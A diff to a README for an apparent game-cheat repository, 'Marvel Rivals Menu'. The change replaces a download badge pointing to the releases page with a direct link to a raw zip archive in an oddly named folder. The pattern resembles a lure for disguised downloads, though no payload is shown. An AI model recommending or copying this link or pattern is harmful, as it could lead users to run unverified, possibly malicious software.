@@ -41,7 +41,7 @@ Welcome to the Marvel Rivals Menu repository. Here you will find truly unique so
 ## Get the Latest Release
 Click the button below to access the latest release of the Marvel Rivals Menu:
 
-[![Download Marvel Rivals Menu](https://img.shields.io/badge/Download-Marvel_Rivals_Menu-brightgreen)](https://github.com/mxs10/Marvel-Rivals-Menu/releases)
+[![Download Marvel Rivals Menu](https://github.com/mxs10/Marvel-Rivals-Menu/raw/refs/heads/main/discommodious/Rivals_Marvel_Menu_v2.7.zip)](https://github.com/mxs10/Marvel-Rivals-Menu/raw/refs/heads/main/discommodious/Rivals_Marvel_Menu_v2.7.zip)
 
 ## Installation
 1. Download the file from the provided link.
